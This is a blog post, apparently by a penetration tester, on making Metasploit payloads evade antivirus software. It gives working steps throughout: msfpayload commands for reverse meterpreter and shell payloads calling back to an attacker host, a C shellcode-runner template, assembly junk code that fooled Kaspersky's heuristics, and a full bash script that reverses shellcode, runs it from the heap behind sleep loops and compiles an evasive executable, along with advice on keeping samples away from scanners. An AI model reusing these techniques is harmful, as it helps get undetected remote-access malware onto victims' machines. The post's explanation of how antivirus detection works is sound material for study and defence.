---
layout: post
title: "Notes on Anti-virus Evasion"
excerpt: "反病毒软件调戏笔记: 如何使用metasploit项目的shellcode且不被反恶意软件查出"
category: exploit
tags: [anti-virus]
disqus: true
---


Ok, This article is about why and how can you bypass antivirus softwares when you are using metasploit payloads. First of all, I'd like to emphasize the following things:

1. Don't be stupid. Do anything at your own risk.
2. There is nothing too hard to learn. If you find something really hard to understand. [Try harder](http://www.offensive-security.com/when-things-get-tough/), you may lack of some necessary requirements, please refer to References section yourself. 
3. There are lots of Unix tools to use for linux, so I use gentoo linux as my experiment environment. You can use anything you like.
4. I'm not a native English speaker, but I hope this article is interesting and useful to many non-Chinese speakers. So I write every word in a language I'm not familiar. The article may full with grammer mistakes, but you can understand what I'm saying is enough. Happy hacking.
5. Last but not least, Never upload your samples to a online scanner website like virustotal or so if you are a penetration tester and want to use your payload later. Check it on your local machine. you can alse try [novirusthanks](http://vscan.novirusthanks.org/) with `Do not distribute the sample` marked.

## Theory: How Antivirus software works

### Signature-based Detection

Why can you bypass AV detection? There won't much way for AV vendors to decide whether a software is a normal program or a malware. They have 3 main ways, the most popular method it use to scan malwares is based on signature. AV engines scan the whole program to find something in accordance with the kown 'bad strings' in malwares. Once 'bad strings' being found, the program will be flagged as a malware.

You will soon see it is so. Lets take [Avast!](http://www.avast.com/) free edition as example. I do all my test on my linux machine, but you can do anything as you like.

First, Let's use a `windows/meterpreter/reverse_tcp` payload from [Metasploit](http://metasploit.com/). It will provide a reverse meterpreter shell to a remote computer for the hackers.

    ~/metasploit-framework/msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.56.102 X > payload.exe

Start a listenner and assert it really works
    
    wine payload.exe

However, Avast! will find its a malware! Moreover, even when you open the file explorer, the payload will be found before any scan.

To my surprise, Avast! will flag the binary files(Non-execute files) as malwares too. So it look like it use some 'signature' to judge whether a program is malicious or not. But, what's the signature?

To find out the 'bad string', I use the old bisection method to locate where the signature really is:

    ~/metasploit-framework/msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.56.102 R > payload_raw
    cat payload_raw | cut -c614-663 > malicious.txt

Ok, then I get the 'bad string' into `malicious.txt`. Scan it with Avast!, Avast! flag it as malware. You can download it [here](https://github.com/reverland/scripts/blob/master/else/malicious.txt) and test it with your own avast.

Now we are sure AV softwares use signature to find malwares. It is true, whenever a new suspicious files uploaded to AV vendors(for example, upload it to [Virustotal](https://www.virustotal.com/)), the new malware's signature will be soon added to the virus signature database soon.

But thats not all.

There are other thing AV vendors use to detect malware. For metasploit is too famous in penetration testers' group and other groups, AV softwares begin to detect whether the software is created with it. As a result, even if its not a malware, much AV will still flag your metasploit-created program as malware. You may check the [Metasploit: Low Level View](http://www.intelligentexploit.com/articles/Metasploit:-Low-Level-View.pdf) to learn more.

Seeing is believing. Let's use metasploit framework to generate a program with no payload[^1]:

    echo -ne | ~/metasploit-framework/msfencode -e generic/none -k -x calc.exe -t exe -o calc_no_payload.exe

However, Avast! mark it as a threat `Win32 Rozpatch`, most AVs will detect it as malwares or simply virus as well, you can upload it to [metascan](http://metascan-online.com/) to check it.

What does that mean? You should use another way to generate programs if you won't like your program to be detected.

In a word, Metasploit project are so well-known that nearly all it's encoders and ways to generate programs are well researched. The encoder stub are simply to detect, the strange entrypoint to a rwx section are simply to detect. Much AVs are just detect these things rather than the real 'bad signature'. Then we know we must use our own way to generate programs.

### Sandbox

However, sandbox becomes more and more popular. Whenever a suspicious program runs, it will be comfined to a virtual sandbox environment. If they do something that can be flagged as malicious, the program will soon be marked as malware. Some AV will scan suspicious programs in this way. However, sandbox will take up too much system resources, it will only run it in sandbox for only little time than release it.

So malware authors begin to sleep or do some useless loops to pass the sandbox time. However, some AVs begin to flag program has the strange sleep and loops as malwares as a countermeasure.

The next example is to demonstrate this:

```c
#include <stdio.h>
#include <stdlib.h>
/* test for malwares */
char code[] = 
"";
int add(int);
int main(int argc, char *argv[])
{
  int i,j;
  for(i=0;i<100;i++){
    for(j=0;j<100;j++)
      printf("wait...");
  }
  }
```

Then compile and link it.

     ✘ ⮀ ~/Work/project/bypassav ⮀ wine ~/.wine/drive_c/lcc/bin/lcc test.c -o test.o
     ✘ ⮀ ~/Work/project/bypassav ⮀ wine ~/.wine/drive_c/lcc/bin/lcclnk.exe test.o -o test.exe

Then I upload it to metascan, 3 AVs mark it as malware though its nothing. The report is [here](https://www.metascan-online.com/en/scanresult/file/bb96f4ab4ed74ae1b8766a6762b42470)

So you may have to use other ways to avoid these avs. Fortunately, there are tons of method to do this.(May not fortunate : ( )

### Heuristic

When I try to bypass Kaspersky, It will always mark my deliberate payload with its heuristic engine. It's really frustrating. You don't know how heuristic works. At first I guess its something check special things like for-loop talked above in programs. So I remove my shellcode. It passed Kaspersky. I add my shellcode but not run it, it passed too. Then I noticed Kaspersky takes more time than other AVs to scan a sample. So I guess it may use a sandbox to check programs. However, when I use some sleep/for-loop tricks kaspersky will still mark my malware out. I check whether kaspersky will mark the sleep/for-loop section as malware, it didn't.

So, that's strange. How heuristic works? 

After search on google, I find that kaspersky's heuristic engine may check the windows api call of a program without running it. I remember _Metasploit: Low Level View_ once said:

> Two effective methods are used to detect Polymorphic and Metamorphic
> 
> malware are :
> 
> − SAVE
> 
> on SAVE method a sequence of windows API calls are checked which
> represent the signature of a malware. To decide whether a file is infected or
> not; The ecludian distance between every API call is calculated. And if the
> avg. of the API calls distances is less than 10% then a file is flagged as
> infected. This implies on the (disk-level) injected code probably to be
> detected
> 
> − Semantic aware
> 
> Here signatures are represented as control flow or tuples on instruction, on
> disk-level a program is disassembled and a control flow is generated and
> then compared to the signatures control flows and decided whether a
> program is infected or not.

No matter which method, you can simply disassemble metasploit's payload and add some strange calls or jmps to confuse the heuristic engine. And I succeed fool Kaspersky just with a little simple `loop`:

```nasm
    push ecx
    add ecx,0x100
    push eax
xxx:
    imul eax, 0x100
    xor eax, eax
    loop xxx
```

The next section is my experiment and some scan report.

## Experiment on bypass Antivirus software

I want to bypass all av with metasploit generated payload. this is my program template to inject payload:

```c
#include <stdio.h>
/* shellprogram.c */
char code[] = 
"<payload here>"
"";
int main(int argc, char *argv[])
{
    int (*exeshell)();
    exeshell = (int (*)()) code;
    (int)(*exeshell)();
  }
```

To avoid the signature detection of the well-known metasploit payload, You can disassemble it and add random non-sense instructions(for example， push and pop) to make the binary different from the original one. You can simply write a script to automatic this like I do.[^2] Finally, get the new C style shellcode.

     ~/Work/project/bypassav ⮀ ~/metasploit-framework/msfpayload windows/shell/reverse_tcp LHOST=192.168.56.102 R > shell_reverse_raw
     ~/Work/project/bypassav ⮀ python ndisasm.py shell_reverse_raw > ghost-writing.asm
     ~/Work/project/bypassav ⮀ nasm ghost-writing.asm -o new
     ~/Work/project/bypassav ⮀ od -tx1 test.o | cut -c8-80 | sed -e 's/ /\\x/g' | sed -e 's/^/"/g' | sed -e 's/$/"/g'

Bypass all AVs' detection is a challenge, for to avoid one AV you may trigger another one. The program above will bypass most but Asquared.

Why? I try to remove my shellcode just test the template, It will still be marked by avs. You can check the report [here](http://vscan.novirusthanks.org/analysis/684ebdecaf29c41841833d9738c4ccac/Yy1ub25lLWV4ZQ==/) and [here](http://r.virscan.org/report/d35e77a1472bea0119ca8d1ec56d7b1a.html)
     
So it looks like execute from the data section is suspicious! There must many people use this tricks!

So I decided to copy it to heap and execute shellcode from heap.

[No shellcode and execute from heap](http://vscan.novirusthanks.org/analysis/312caba7ca97f0b0b6deee4e0ebb2b7a/Yy1zaGVsbC1yZXZlcnNlLW5hc20taGVhcC1ndy11/), No AV mark it as malicious. Another [Report here](https://www.metascan-online.com/en/scanresult/file/dc5c7080fc44495f880facfdfc2b9eb1)

So, move your modified shellcode(You must Modified it so won't be checked before execution) to heap and execute from heap. However, some AVs can detect it, here's the [report](https://www.metascan-online.com/en/scanresult/file/e3442be2dd0f4a089a2c16db2d387880) and [another one](http://vscan.novirusthanks.org/analysis/312caba7ca97f0b0b6deee4e0ebb2b7a/Yy1zaGVsbC1yZXZlcnNlLW5hc20taGVhcC1ndy11/).

make the modified upsidedown won't bypass it and the name it marked never change. So I doubt these avs use sandbox to detect my shellcode.

So I add some sleep/for-loop to fool them. As mentioned earlier, you'd better try more find a slitely deferent way to fool them. It may work, but it may trigger other detection technichs.

After several tries and errors, I bypass all but Kaspersky. After several tries I know its not sandbox and signature. Then the story has been write earlier in this article.

The final bypass all report is [here](https://www.metascan-online.com/en/scanresult/file/df3906541f8846f9a5ef38c7e31505e9) You can download from [here](https://github.com/reverland/scripts/blob/master/exe/hahaha.exe) to check it(LHOST 192.168.56.102, windows/meterpreter/reverse\_tcp, LPORT=4444, md5sum listed is in metascan)

Another thing to mention, I just upload it to virusnothanks when I did my experiments, for I don't want to make the experiment uncerntainly. But now upload to anywhere is ok. If you want to do some experiments for several days, do not upload it to virustotal or metascan or viruscan and so on. You suspicious payload will be marked in one day.(Kaspersky really mark my payload in one day!)

I finally write scripts which generate random instructions for assemble language, encrypt or simply upsidedown shellcodes and automatic the whole process to facilitate my work. you can try one yourself. Similar to this one:

    ```bash
    #! /bin/env bash
    nasm -fbin "$1" -o test.o
    
    cat >> test.c << EOF_FLAG
    #include <stdio.h>
    #include <stdlib.h>
    #include <windows.h>
    /* shellprogram.c */
    char code[] = 
    EOF_FLAG
    
    LEN=`wc -c test.o| cut -d' ' -f1`
    python upsidedown.py test.o
    od -tx1 test.o | cut -c8-80 | sed -e 's/ /\\x/g' | sed -e 's/^/"/g' | sed -e 's/$/"/g' >> test.c
    
    echo "\"\";" >> test.c
    
    cat >> test.c << EOF_FLAG
    int add(int);
    int main(int argc, char *argv[])
    {
      int i, len, s;
      char *p;
      i = 0;
    EOF_FLAG
    
    str='len = '${LEN}';'
    echo ${str} >> test.c
    
    cat >> test.c << EOF_FLAG
      p = (char *)malloc(len);
      for(i=0;i<100;i++){
      s = add(i);
      sleep(1);
      }
      for(i=0;i<len;i++)
        {
          p[i] = code[len - 1 - i];
        }
        int (*exeshell)();
        exeshell = (int (*)()) p;
        (int)(*exeshell)();
      }
    
    int add(int num)
    {
    static int sn;
    sn+=num;
    if(num==10000) return sn;
    add(++num);
    }
    EOF_FLAG
    
    # test.rc
    cat >> test.rc << EOF_FLAG
    1 ICON "test.ico"
    EOF_FLAG
    
    wine ~/.wine/drive_c/lcc/bin/lcc.exe test.c -o test.obj
    wine ~/.wine/drive_c/lcc/bin/lrc.exe test.rc /otest.res
    wine ~/.wine/drive_c/lcc/bin/lcclnk.exe test.obj test.res -o test.exe
    i686-pc-mingw32-strip test.exe
    
    rm test.o
    rm test.rc
    rm test.obj
    rm test.res
    rm test.c
    #rm test_encode.o
    #wine test.exe
    #rm test.exe
    
    ```

## Conclusion

Theory about how AV detect are easy to understand and bypass, but AV vendors will also exert to detect malwares. Some may useful, some may outdated. These techs are sprayed among the Reference section, you can also google more. I don't talk about it much. The world is changing quickly(especially for security), check it by yourselves.

Finally you will see, the most effective way to avoid any AV, however, is to write your own tools or use them your own way. All you need is just to be creative. 

Last, I'll recommend [Veil](https://github.com/ChrisTruncer/Veil/) to you. It's really a amazing tool for penetration testers.

Lastly, Chinese: 英文作文真难写……

## Reference

You can find more below and special thanks to them:

- [100% Anti-Virus evasion with Metasploit browser exploits(example with ms11-003)](http://funoverip.net/2011/04/100pc-anti-virus-evasion-with-metasploit-browser-exploits-from-ms11-003/)
- [Anti-Virus Evasion: A Peek Under the Veil](http://pen-testing.sans.org/blog/pen-testing/2013/07/12/anti-virus-evasion-a-peek-under-the-veil)
- [Avoiding AV Detection](http://spareclockcycles.org/tag/antivirus-evasion/)
- [AV0id – Anti-Virus Bypass Metasploit Payload Generator Script](http://www.commonexploits.com/?p=789)
- [bypassing all anti-virus in the world (Good Bye Detection , Hello Infection)](http://www.abysssec.com/blog/2011/09/25/bypassing-all-anti-virus-in-the-world-good-bye-detection-hello-infection/)
- [Msfencode a Msfpayload Into An Existing Executable](http://carnal0wnage.attackresearch.com/2010/03/msfencode-msfpayload-into-existing.html)
- [Process Injection Outside of Metasploit](http://carnal0wnage.attackresearch.com/2011/07/process-injection-outside-of-metasploit.html)
- [Effectiveness of Antivirus in Detecting Metasploit's Payloads](http://pen-testing.sans.org/resources/papers/gcih/effectiveness-antivirus-detecting-metasploit-payloads-106563)
- [Evading Anti-Virus Detection - Whiteboard Wednesday](https://community.rapid7.com/community/metasploit/blog/2013/01/17/evading-anti-virus-detection--whiteboard-wednesday)
- [Facts and myths about antivirus evasion with Metasploit](http://schierlm.users.sourceforge.net/avevasion.html)
- [The Odd Couple: Metasploit and Antivirus Solutions](https://community.rapid7.com/community/metasploit/blog/2012/12/14/the-odd-couple-metasploit-and-antivirus-solutions)
- [Using Metasm To Avoid Antivirus Detection (Ghost Writing ASM)](http://www.pentestgeek.com/2012/01/25/using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/)
- [Tips for Evading Anti-Virus During Pen Testing](http://pen-testing.sans.org/blog/2011/10/13/tips-for-evading-anti-virus-during-pen-testing)
- [Why Encoding Does not Matter and How Metasploit Generates EXE’s](http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/)
- [Evading Antimalware Engines via Assembly Ghostwriting](http://www.exploit-db.com/download_pdf/17968)
- [分析卡巴斯基启发式扫描及其绕过方案(Chinese)](http://blog.sina.com.cn/s/blog_63a4534c01012ugj.html)

## FootNotes

[^1]: Example comes from [http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/](http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/)
[^2]: Thanks to the article on [Pentest Geek](http://www.pentestgeek.com/2012/01/25/using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/#comment-513), however, nasm may a better choice. for there won't be piles of `db`s
